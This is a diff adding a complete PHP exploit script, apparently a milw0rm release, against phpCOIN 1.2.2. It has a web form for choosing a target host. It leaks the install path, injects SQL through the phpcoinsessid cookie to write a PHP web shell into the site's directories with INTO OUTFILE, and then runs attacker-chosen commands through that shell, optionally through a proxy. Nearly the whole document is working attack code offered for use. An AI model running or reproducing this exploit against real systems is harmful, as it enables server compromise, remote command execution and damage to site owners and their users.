@@ -1,0 +1,271 @@
+<?php
+#   ---phpcoin_122_sql_xpl.php                                                 #
+#                                                                              #
+#     phpCOIN 1.2.2 phpcoinsessid blind SQL injection / remote code execution  #
+#                              coded by rgod                                   #
+#                    site: http://rgod.altervista.org                          #
+#                                                                              #
+#  -> this works with magic_quotes_gpc off                                     #
+#  usage: launch from Apache, fill in requested fields, then go!               #
+#                                                                              #
+#  Sun-Tzu:"When these five kinds of spy are all at work, none can discover    #
+#  the secret system.  This is called "divine manipulation of the threads." It #
+#  is the sovereign's most precious faculty."                                  #
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout", 5);
+ob_implicit_flush (1);
+
+echo'<html><head><title>phpCOIN 1.2.2 blind SQL injection  /  remote cmmnds xctn
+</title><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<style type="text/css"> body {background-color:#111111;   SCROLLBAR-ARROW-COLOR:
+#ffffff; SCROLLBAR-BASE-COLOR: black; CURSOR: crosshair; color:  #1CB081; }  img
+{background-color:   #FFFFFF   !important}  input  {background-color:    #303030
+!important} option {  background-color:   #303030   !important}         textarea
+{background-color: #303030 !important} input {color: #1CB081 !important}  option
+{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox
+{background-color: #303030 !important} select {font-weight: normal;       color:
+#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;
+background-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:
+0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em
+!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em
+!important} 	h2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em
+!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:
+normal !important} *{text-decoration: none !important} a:link,a:active,a:visited
+{ text-decoration: none ; color : #99aa33; } a:hover{text-decoration: underline;
+color : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;
+font-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;
+font-weight:bold; font-style: italic;}--></style></head><body><p class="Stile6">
+phpCOIN 1.2.2 blind SQL injection  /  remote cmmnds xctn</p><p class="Stile6">a
+script  by  rgod  at        <a href="http://rgod.altervista.org"target="_blank">
+http://rgod.altervista.org</a></p><table width="84%"><tr><td width="43%">  <form
+name="form1" method="post"  action="'.strip_tags($SERVER[PHP_SELF]).'"><p><input
+type="text"  name="host"> <span class="Stile5">* hostname (ex:www.sitename.com)
+</span></p> <p><input type="text" name="path">  <span class="Stile5">* path (ex:
+/phpcoin/ or just / ) </span></p><p><input type="text" name="command">     <span
+class="Stile5"> * specify a command  </span>  </p> <p>        <input type="text"
+name="pathtoWWW"> <span class="Stile5">   full application path      (ex:
+"/www/phpcoin/", "../../www/phpcoin/","c:\www\phpcoin\" ), if not specified,  we
+will try to disclose the path  </span> </p> <p>        <input type="text"
+name="PREFIX"> <span class="Stile5"> Specify a table prefix  (default: phpcoin_)
+</span> </p><p> <input type="text" name="port"><span class="Stile5">specify  a
+port   other than  80 ( default  value )</span></p><p><input  type="text"
+name="proxy"><span class="Stile5">send  exploit through an  HTTP proxy (ip:port)
+</span></p><p><input type="submit" name="Submit" value="go!"></p></form> </td>
+</tr></table></body></html>';
+
+function show($headeri)
+{
+$ii=0;
+$ji=0;
+$ki=0;
+$ci=0;
+echo '<table border="0"><tr>';
+while ($ii <= strlen($headeri)-1)
+{
+$datai=dechex(ord($headeri[$ii]));
+if ($ji==16) {
+             $ji=0;
+             $ci++;
+             echo "<td>&nbsp;&nbsp;</td>";
+             for ($li=0; $li<=15; $li++)
+                      { echo "<td>".$headeri[$li+$ki]."</td>";
+			    }
+            $ki=$ki+16;
+            echo "</tr><tr>";
+            }
+if (strlen($datai)==1) {echo "<td>0".$datai."</td>";} else
+{echo "<td>".$datai."</td> ";}
+$ii++;
+$ji++;
+}
+for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)
+                      { echo "<td>&nbsp&nbsp</td>";
+                       }
+
+for ($li=$ci*16; $li<=strlen($headeri); $li++)
+                      { echo "<td>".$headeri[$li]."</td>";
+			    }
+echo "</tr></table>";
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+
+function sendpacket() //if you have sockets module loaded, 2x speed! if not,load
+		              //next function to send packets
+{
+  global $proxy, $host, $port, $packet, $html, $proxy_regex;
+  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+  if ($socket < 0) {
+                   echo "socket_create() failed: reason: " . socket_strerror($socket) . "<br>";
+                   }
+	      else
+ 		  {   $c = preg_match($proxy_regex,$proxy);
+              if (!$c) {echo 'Not a valid prozy...';
+                        die;
+                       }
+                    echo "OK.<br>";
+                    echo "Attempting to connect to ".$host." on port ".$port."...<br>";
+                    if ($proxy=='')
+		   {
+		     $result = socket_connect($socket, $host, $port);
+		   }
+		   else
+		   {
+
+		   $parts =explode(':',$proxy);
+                   echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
+		   $result = socket_connect($socket, $parts[0],$parts[1]);
+		   }
+		   if ($result < 0) {
+                                     echo "socket_connect() failed.\r\nReason: (".$result.") " . socket_strerror($result) . "<br><br>";
+                                    }
+	                       else
+		                    {
+                                     echo "OK.<br><br>";
+                                     $html= '';
+                                     socket_write($socket, $packet, strlen($packet));
+                                     echo "Reading response:<br>";
+                                     while ($out= socket_read($socket, 2048)) {$html.=$out;}
+                                     echo nl2br(htmlentities($html));
+                                     echo "Closing socket...";
+                                     socket_close($socket);
+
+				    }
+                  }
+}
+function sendpacketii($packet)
+{
+global $proxy, $host, $port, $html, $proxy_regex;
+if ($proxy=='')
+      {$ock=fsockopen(gethostbyname($host),$port);
+       if (!$ock) { echo 'No response from '.htmlentities($host);
+			die; }
+      }
+             else
+           {
+	   $c = preg_match($proxy_regex,$proxy);
+              if (!$c) {echo 'Not a valid prozy...';
+                        die;
+                       }
+	   $parts=explode(':',$proxy);
+	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
+	    $ock=fsockopen($parts[0],$parts[1]);
+	    if (!$ock) { echo 'No response from proxy...';
+			die;
+		       }
+	   }
+fputs($ock,$packet);
+if ($proxy=='')
+  {
+
+    $html='';
+    while (!feof($ock))
+      {
+        $html.=fgets($ock);
+      }
+  }
+else
+  {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
+    {
+      $html.=fread($ock,1);
+    }
+  }
+fclose($ock);
+echo nl2br(htmlentities($html));
+}
+
+$host=$_POST[host];
+$path=$_POST[path];
+$port=$_POST[port];
+$command=$_POST[command];
+$pathtoWWW=$_POST[pathtoWWW];
+$PREFIX=$_POST[PREFIX];
+
+if (($host<>'') and ($path<>'') and ($command<>''))
+{
+$port=intval(trim($port));
+if ($port=='') {$port=80;}
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+$host=str_replace("\r\n","",$host);
+$path=str_replace("\r\n","",$path);
+if ($PREFIX=='') { $PREFIX="phpcoin_";}
+if ($pathtoWWW=='')
+{
+#STEP 0 -> Disclose full application path
+$packet="GET ".$p."config.php HTTP/1.1\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="User-Agent: J-PHONE/3.0/J-SH07\r\n";
+$packet.="Connection: Close\r\n\r\n";
+show($packet);
+sendpacketii($packet);
+if (eregi("Fatal error",$html))
+    {
+      $temp=explode("in <b>",$html);
+      $temp2=explode("coin_includes",$temp[1]);
+      $pathtoWWW=$temp2[0];
+      echo "Full application path ->".htmlentities($pathtoWWW)."<br>";
+    }
+else {echo "sorry, unable to disclose path..."; die;}
+}
+
+$pathtoWWW=str_replace('\\','\\\\\\\\',$pathtoWWW); //for Windows boxes...
+$dirs= array
+(
+ '', 'coin_admin/', 'coin_auxpages/', 'coin_cron/', 'coin_database/', 'coin_docs/', 'coin_images/',
+ 'coin_includes/', 'coin_lang/', 'coin_modules/', 'coin_setup/', 'coin_themes/',
+ 'coin_lang/lang_english/','coin_modules/articles/','coin_modules/cc/',
+ 'coin_modules/clients/', 'coin_modules/domains/','coin_modules/downloads/',
+ 'coin_modules/faq/','coin_modules/helpdesk/','coin_modules/invoices/',
+ 'coin_modules/mail/','coin_modules/orders/','coin_modules/pages/',
+ 'coin_modules/search/', 'coin_modules/siteinfo/', 'coin_modules/whois/',
+ 'coin_setup/sql/',
+ 'coin_themes/cantex/','coin_themes/classic/','coin_themes/coolblue/',
+ 'coin_themes/earthtone/',
+ 'coin_themes/cantex/html/','coin_themes/cantex/images/','coin_themes/cantex/images/nav/',
+ 'coin_themes/classic/html/','coin_themes/classic/images/','coin_themes/classic/images/nav/',
+ 'coin_themes/coolblue/html/', 'coin_themes/coolblue/images/','coin_themes/coolblue/images/nav/',
+ 'coin_themes/earthtone/html/','coin_themes/earthtone/images/', 'coin_themes/earthtone/html/nav/'
+);
+
+for ($i=0; $i<=count($dirs)-1; $i++)
+{
+#STEP 1 ->Shell inject
+//we have to be sure that phpcoin_sessions table is not empty, so firstly
+//we call main index page
+$packet="GET ".$p."index.php HTTP/1.1\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="User-Agent: Gulliver/1.3\r\n";
+$packet.="Connection: Close\r\n\r\n";
+show($packet);
+sendpacketii($packet);
+//max 36 chars shell
+$SQL="-' UNION SELECT 'Hi!<?php system(\$_GET[cmd]);?>' INTO OUTFILE '".$pathtoWWW.$dirs[$i]."coin_cfg.php' FROM ".$PREFIX."sessions LIMIT 1/*";
+$SQL=urlencode($SQL);
+$packet="GET ".$p."mod.php HTTP/1.1\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="User-Agent: Inktomi Search\r\n";
+$packet.="Cookie: phpcoinsessid=".$SQL."; \r\n";
+$packet.="Connection: Close\r\n\r\n";
+show($packet);
+sendpacketii($packet);
+
+#STEP 2 -> Launch commands...
+$packet="GET ".$p.$dirs[$i]."coin_cfg.php?cmd=".urlencode($command)." HTTP/1.1\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="User-Agent: Industry Program 1.0.x\r\n";
+$packet.="Connection: Close\r\n\r\n";
+show($packet);
+sendpacketii($packet);
+if (eregi("Hi!",$html)) {echo "Exploit succeeded...";die;}
+}
+}
+else
+{echo "Fill * required, optionally specify a proxy ";}
+
+?>
+
+# milw0rm.com [2005-12-12]
